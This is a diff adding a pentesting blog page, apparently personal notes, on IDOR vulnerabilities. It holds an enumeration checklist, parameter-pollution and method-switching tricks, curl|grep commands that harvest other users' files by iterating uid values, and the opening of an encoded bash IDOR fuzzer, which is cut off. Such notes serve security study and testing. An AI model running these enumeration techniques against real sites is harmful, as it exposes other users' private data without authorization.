@@ -1,0 +1,1936 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.135.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Insecure Direct Object References (IDOR) |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
+                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Insecure Direct Object References (IDOR) -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Attacks </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/attack/20240206062546-insecure_direct_object_references_idor/" title="./attack/20240206062546-insecure_direct_object_references_idor/">
+                        
+                            Insecure Direct Object References (IDOR)
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheet/20230505162602-active_directory/" title="./cheatsheet/20230505162602-active_directory/">
+                        
+                            Active Directory
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheet/20230505140235-privesc_linux/" title="./cheatsheet/20230505140235-privesc_linux/">
+                        
+                            PrivEsc Linux
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheet/20230505155252-transferring_files/" title="./cheatsheet/20230505155252-transferring_files/">
+                        
+                            Transferring Files
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tool/20230504114449-gobuster/" title="./tool/20230504114449-gobuster/">
+                        
+                            Gobuster
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tool/20230505160102-scp/" title="./tool/20230505160102-scp/">
+                        
+                            SCP 
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Insecure Direct Object References (IDOR)
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="0001.01.01"
+                            >0001.01.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        18 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/attack/" class="bread-btn">
+    
+
+    
+        Attacks
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/attack/20240206062546-insecure_direct_object_references_idor/" class="bread-btn">
+    
+
+    
+        
+            Insecure Direct Object References (IDOR)
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#seperate-enumeration-and-attacks-properly-dot"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> seperate enumeration and attacks properly.</a></li>
+    <li><a href="#used-for">Used-For: <del>Accessing Other Users Data/Account Takeover</del></a></li>
+    <li><a href="#attack-information">Attack Information:</a></li>
+    <li><a href="#a39ebd"><del>IDOR Enumeration</del>:</a>
+      <ul>
+        <li><a href="#idor-enumeration-checklist"><code>IDOR Enumeration Checklist</code>: <!-- raw HTML omitted -->[0/14]<!-- raw HTML omitted --></a></li>
+        <li><a href="#mass-idor-enumeration">Mass IDOR Enumeration:</a></li>
+        <li><a href="#check-url-parameters">Check URL Parameters:</a></li>
+        <li><a href="#hashing-and-encoding-of-parameters">Hashing &amp; Encoding of parameters:</a></li>
+        <li><a href="#bypassing-encoded-references">Bypassing Encoded References:</a></li>
+        <li><a href="#idor-bypass-via-function-disclosure">IDOR Bypass via Function Disclosure:</a></li>
+        <li><a href="#idor-in-insecure-apis">IDOR in Insecure APIs:</a></li>
+        <li><a href="#manipulating">Manipulating :</a></li>
+        <li><a href="#compare-user-roles-create-multiple-user-accounts-for-comparison">Compare User Roles/Create Multiple User Accounts for Comparison:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4e02a6"><del>IDOR Attack</del>:</a>
+      <ul>
+        <li><a href="#exploiting-insecure-api-s">Exploiting Insecure API&rsquo;s:</a></li>
+        <li><a href="#information-disclosure-via-idor-vulnerbility">Information Disclosure Via IDOR vulnerbility:</a></li>
+        <li><a href="#chaining-idor-vulnerabilities-for-further-exploitation">Chaining IDOR Vulnerabilities For Further Exploitation:</a></li>
+        <li><a href="#idor-script-for-grabbing-information">IDOR Script for grabbing information:</a></li>
+      </ul>
+    </li>
+    <li><a href="#idor-prevention">IDOR Prevention:</a></li>
+    <li><a href="#tools-used-for-the-attack">Tools Used for the attack:</a></li>
+    <li><a href="#references">References:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <ul>
+<li>
+<p>How to find IDORs:</p>
+<ul>
+<li><a href="https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489">https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489</a></li>
+</ul>
+</li>
+<li>
+<p>What is an IDOR:</p>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References</a></li>
+</ul>
+</li>
+<li>
+<p>Examples of IDOR Vulns in the wild:</p>
+<ul>
+<li><a href="https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486">https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486</a></li>
+<li><a href="https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a">https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a</a></li>
+<li><a href="https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3">https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3</a></li>
+<li><a href="https://vickieli.medium.com/intro-to-idor-9048453a3e5d">https://vickieli.medium.com/intro-to-idor-9048453a3e5d</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="seperate-enumeration-and-attacks-properly-dot"><!-- raw HTML omitted -->TODO<!-- raw HTML omitted --> seperate enumeration and attacks properly.</h2>
+<h2 id="used-for">Used-For: <del>Accessing Other Users Data/Account Takeover</del></h2>
+<p>IDOR vulnerabilities can have a significant impact on web applications. The most basic example of an IDOR vulnerability is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data, which is known as IDOR Information Disclosure Vulnerabilities. Depending on the nature of the exposed direct reference, the vulnerability may even allow the modification or deletion of other users&rsquo; data, which may lead to a complete account takeover.</p>
+<p>Once an attacker identifies the direct references, which may be database IDs or URL parameters, they can start testing specific patterns to see whether they can gain access to any data and may eventually understand how to extract or modify data for any arbitrary user.</p>
+<p>IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with IDOR Insecure Function Calls. For example, many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. However, if we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users&rsquo; passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application.</p>
+<h2 id="attack-information">Attack Information:</h2>
+<ul>
+<li>
+<p>Definition</p>
+<ul>
+<li>A security flaw where an application exposes a reference to an internal implementation object, such as a file, directory, or database key, without proper authorization checks.</li>
+</ul>
+</li>
+<li>
+<p>Common Examples</p>
+<ul>
+<li>Exposed database record IDs in URLs or form fields that can be manipulated to access other users&rsquo; data.</li>
+<li>Direct references to files or directories in the web server that can be accessed or downloaded without proper authentication.</li>
+</ul>
+</li>
+<li>
+<p>Attack Scenarios</p>
+<ul>
+<li>Changing an exposed user ID in the URL to access another user&rsquo;s personal information.
+<ul>
+<li>See good examples at the top of these vulns in the wild.</li>
+</ul>
+</li>
+<li>Manipulating reference keys in API requests to retrieve or modify data belonging to other users.</li>
+</ul>
+</li>
+<li>
+<p>Risks and Impact</p>
+<ul>
+<li>Unauthorized access to sensitive information.</li>
+<li>Data leakage and privacy breaches.</li>
+<li>Potential modification or deletion of data belonging to other users.</li>
+</ul>
+</li>
+<li>
+<p><strong>Prevention &amp; Detection</strong>:</p>
+<ul>
+<li>Implementing proper access control checks to ensure users can only access objects they are authorized to.</li>
+<li>Avoiding the use of direct object references in user-accessible inputs whenever possible.</li>
+<li>Using indirect reference maps or tokens to reference internal objects.</li>
+<li>Regularly auditing and testing applications for IDOR vulnerabilities.</li>
+</ul>
+</li>
+</ul>
+<h2 id="a39ebd"><del>IDOR Enumeration</del>:</h2>
+<ul>
+<li>How to find IDORs:
+<ul>
+<li><a href="https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489">https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="idor-enumeration-checklist"><code>IDOR Enumeration Checklist</code>: <!-- raw HTML omitted -->[0/14]<!-- raw HTML omitted --></h3>
+<ul>
+<li>
+<p><input disabled="" type="checkbox"> Check URL parameters:</p>
+<ul>
+<li><input disabled="" type="checkbox"> Check for any hashing/encoding of parameters in JS functions.</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Use when enumerating:</p>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Be check for any AJAX API Calls on the page.</p>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Check if source code is readable.</p>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Encoded and Hashed IDs <!-- raw HTML omitted -->[0/3]<!-- raw HTML omitted --></p>
+<ul>
+<li><input disabled="" type="checkbox"> Decode encoded IDs using common encoding schemes.</li>
+<li><input disabled="" type="checkbox"> Analyze hashed/randomized IDs for predictability due to low entropy.</li>
+<li><input disabled="" type="checkbox"> Create multiple accounts to find patterns in ID generation.</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Increasing Impact of IDORs</p>
+<ul>
+<li><input disabled="" type="checkbox"> Focus on Critical Functionalities
+<ul>
+<li>Prioritize IDORs in functionalities with high business impact, such as password reset/change and account recovery.</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> Sensitive Information
+<ul>
+<li>Target functionalities handling sensitive data like direct messages, user information, and private content.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Leaking IDs</p>
+<ul>
+<li>Check for ID leaks through other API endpoints, public pages, or URL referers.
+<ul>
+<li><del>Example Case</del>:
+<ul>
+<li>Found API endpoint /api_v1/messages?conversation_id=SOME_RANDOM_ID leaking conversation IDs.</li>
+<li>Obtained conversation IDs via /api_v1/messages?user_id=ANOTHER_USERS_ID using publicly available user IDs.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Manipulating ID Creation</p>
+<ul>
+<li><input disabled="" type="checkbox"> Explore possibilities to influence the creation or linking of object IDs.
+<ul>
+<li>This helps us see how ID&rsquo;s are created etc and we can check if we can find any commonality in naming/numbering etc.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Adding IDs to Requests</p>
+<ul>
+<li><input disabled="" type="checkbox"> Insert ID parameters (e.g., id, user_id, message_id) into requests to alter application behavior even when it does not ask for it.
+<ul>
+<li><del>Example</del>:
+<ul>
+<li><!-- raw HTML omitted -->Original Request<!-- raw HTML omitted -->:
+<ul>
+<li>GET /api_v1/messages</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Forced ID parameter in request<!-- raw HTML omitted -->:
+<ul>
+<li>GET /api_v1/messages?user_id=ANOTHER_USERS_ID</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> HTTP Parameter Pollution (HPP)</p>
+<ul>
+<li><input disabled="" type="checkbox"> Test for HPP by supplying multiple values for the same parameter to bypass access controls.
+<ul>
+<li><!-- raw HTML omitted -->Original Request<!-- raw HTML omitted -->:
+<ul>
+<li>GET /api_v1/messages?user_id=ANOTHER_USERS_ID</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->HTTP Parameter Pollution<!-- raw HTML omitted -->:
+<ul>
+<li>GET /api_v1/messages?user_id=YOUR_USER_ID&amp;user_id=ANOTHER_USERS_ID</li>
+<li>GET /api_v1/messages?user_id=ANOTHER_USERS_ID&amp;user_id=YOUR_USER_ID</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Blind IDORs</p>
+<ul>
+<li><input disabled="" type="checkbox"> Investigate endpoints for indirect information leaks through export files, emails, or text alerts.
+<ul>
+<li><input disabled="" type="checkbox"> Use</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Changing Request Methods</p>
+<ul>
+<li><input disabled="" type="checkbox"> Experiment with different request methods (GET, POST, PUT, DELETE, PATCH) to bypass access controls.</li>
+<li><input disabled="" type="checkbox"> Use</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Altering Requested File Types</p>
+<ul>
+<li><input disabled="" type="checkbox"> Modify file type extensions in request URLs to test for different server authorization processing.</li>
+<li><input disabled="" type="checkbox"> E.G. try adding <code>.json</code> <code>.xml</code> <code>.php</code> etc to the request URL</li>
+</ul>
+</li>
+<li>
+<p><input disabled="" type="checkbox"> Combining IDORs with Stored-XSS</p>
+<ul>
+<li>Chain write-IDOR with self-XSS to deliver targeted stored-XSS without user interaction.</li>
+<li>When would this be useful? Let’s say you find an IDOR that allows attackers to change the content of another user’s internet shopping list. This IDOR in itself would not be too high impact, and would likely just cause a bit of annoyance if exploited in the wild. But if you can chain this IDOR with a self-XSS on the same input field, you can essentially use this IDOR to deliver the XSS exploit code to the victim user’s browser. This way, you can create targeted stored-XSS that requires no user interaction!</li>
+</ul>
+</li>
+</ul>
+<h3 id="mass-idor-enumeration">Mass IDOR Enumeration:</h3>
+<ul>
+<li>The below exmample works if we are incrememtning a simple counter. (It&rsquo;s a very specific use case.)
+<ul>
+<li>For example we are trying get other documents for users with different UIDs.</li>
+</ul>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->__<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p><strong>Navigate to the page where a resourece is being presented</strong>.</p>
+</li>
+<li>
+<p><strong>Use element inspector to find a unique word that is supplied everytime a resource is presented</strong>:</p>
+<ul>
+<li>For example the below html is taken from a page that is listing resouces we can access &amp; each resource has the prefix <code>'pure-tree_link'</code> so we can use that.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20%3cli%20class=%27pure-tree_link%27%3e%3ca%20href=%27/documents/Invoice_3_06_2020.pdf%27%20target=%27_blank%27%3eInvoice%3c/a%3e%3c/li%3e%0a%20%20%20%20%3cli%20class=%27pure-tree_link%27%3e%3ca%20href=%27/documents/Report_3_01_2020.pdf%27%20target=%27_blank%27%3eReport%3c/a%3e%3c/li%3e">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>    &lt;li class=&#39;pure-tree_link&#39;&gt;&lt;a href=&#39;/documents/Invoice_3_06_2020.pdf&#39; target=&#39;_blank&#39;&gt;Invoice&lt;/a&gt;&lt;/li&gt;
+    &lt;li class=&#39;pure-tree_link&#39;&gt;&lt;a href=&#39;/documents/Report_3_01_2020.pdf&#39; target=&#39;_blank&#39;&gt;Report&lt;/a&gt;&lt;/li&gt;</code></pre>
+    
+</div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the unique string works by curling &amp; greping for the string</strong>:</p>
+<ul>
+<li><code>Command</code>: curl -s &ldquo;<a href="http://">http://</a>&lt;page with resources&gt;&rdquo; | grep &ldquo;unique_word&rdquo;</li>
+<li><del>Example</del>: curl -s &ldquo;<a href="http://server_ip:port/documents.php?uid=1">http://server_ip:port/documents.php?uid=1</a>&rdquo; | grep &ldquo;&lt;li class=&lsquo;pure-tree_link&rsquo;&gt;&rdquo;</li>
+</ul>
+</li>
+<li>
+<p><strong>Use REGEX pattern to remove any unnessary information</strong>:</p>
+<ul>
+<li><code>Command</code>: curl -s &ldquo;<a href="http://">http://</a>&lt;page with resources&gt;&rdquo; | grep -oP &ldquo;\/&lt;Directory&gt;.*?.&lt;extension&gt;&rdquo;</li>
+<li><del>Example</del>: curl -s &ldquo;<a href="http://server_ip:port/documents.php?uid=3">http://server_ip:port/documents.php?uid=3</a>&rdquo; | grep -oP &ldquo;\/documents.*?.pdf&rdquo;</li>
+<li><del>Example</del>: curl -s &ldquo;url&rdquo; | grep -oP &ldquo;\/uploads.*?.png&rdquo;</li>
+<li><del>Example of Just searching for filetype</del>: curl &ldquo;url&rdquo; | grep -oP &ldquo;.*?\.png&rdquo;</li>
+<li><del>Note</del>:
+<ul>
+<li>This command searches the input for any substring that starts with &ldquo;/&lt;directory&gt;&rdquo;, followed by any characters (as few as possible), and ends with &ldquo;.&lt;extension&rdquo;.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Create Bash Script</strong>:</p>
+<ul>
+<li>The below example is very simple, it prompts the user for a method and then iterates through the UID&rsquo;s whilst searching on each page for any files: It&rsquo;s my own.
+<ul>
+<li><a href="https://github.com/mdb-dev-io/idorFuzzer/tree/main">https://github.com/mdb-dev-io/idorFuzzer/tree/main</a></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#!/bin/bash%0a%0a#%20**Define%20the%20base%20URL**%0aecho%20%22Please%20enter%20URL%20you%20want%20to%20test%20for%20IDOR%22%0aread%20url%0a%0a#%20**Select%20HTTP%20Method**%0aecho%20%22Select%20HTTP%20method:%20GET%20or%20POST%22%0aread%20method%0a%0a#%20**Directory%20to%20Search**%0aecho%20%22Enter%20directory%20to%20search%20%28e.g.,%20%27uploads%27,%20omit%20the%20forward%20slash%20%27/%27%29:%20%22%0aread%20directory%0a%0a#%20**Parameter%20to%20Fuzz**%0aecho%20%22Enter%20parameter%20name%20to%20fuzz%20%28e.g.,%20%27uid%27,%20omit%20the%20equals%20%27=%27%29:%20%22%0aread%20parameter%0a%0a#%20**Convert%20Method%20to%20Uppercase**%0amethod=$%7bmethod%5e%5e%7d%0a%0a#%20**Range%20or%20File%20List**%0aecho%20%22Do%20you%20want%20to%20use%20a%20range%20%28R%29%20or%20a%20file%20list%20%28F%29?%20Enter%20R%20or%20F:%22%0aread%20choice%0a%0a#%20**Encoding%20Option**%0aecho%20%22Do%20you%20want%20to%20encode%20parameter%20values?%20%28Y/N%29%22%0aread%20encode%0a%0aif%20[%20%22$choice%22%20=%20%22R%22%20]%20%7c%7c%20[%20%22$choice%22%20=%20%22r%22%20];%20then%0a%20%20%20%20echo%20%22Enter%20the%20start%20of%20the%20range:%22%0a%20%20%20%20read%20start%0a%20%20%20%20echo%20%22Enter%20the%20end%20of%20the%20range:%22%0a%20%20%20%20read%20end%0a%0a%20%20%20%20for%20i%20in%20$%28seq%20$start%20$end%29;%20do%0a%20%20%20%20%20%20%20%20#%20**Encoding%20Check**%0a%20%20%20%20%20%20%20%20if%20[%20%22$encode%22%20=%20%22Y%22%20]%20%7c%7c%20[%20%22$encode%22%20=%20%22y%22%20];%20then%0a%20%20%20%20%20%20%20%20%20%20%20%20e